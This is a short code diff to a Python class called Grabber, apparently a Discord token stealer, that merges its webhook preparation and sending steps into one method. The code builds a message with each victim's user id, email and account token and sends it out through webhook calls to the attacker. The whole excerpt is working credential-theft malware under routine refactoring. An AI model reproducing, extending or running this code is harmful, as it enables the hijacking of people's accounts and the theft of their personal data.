@@ -177,19 +177,15 @@ class Grabber:
             'email': user_data['email']
         }
 
-    def prepare_webhooks(self):
+    def execute_webhooks(self):
         for user in self.users.values():
             for webhook in self.webhooks:
                 webhook.content = 'Hi, my id is `' + user['id'] + '`, my email is `' + user['email'] + '` and my token is `' + user['token'] + '`'
                 webhook.username = user['username']
                 webhook.avatar_url = user['avatar_url']
-
-    def execute_webhooks(self):
-        for webhook in self.webhooks:
-            webhook.execute()
+                webhook.execute()
 
     def start(self):
         self.grab_tokens()
         if self.webhooks:
-            self.prepare_webhooks()
             self.execute_webhooks()
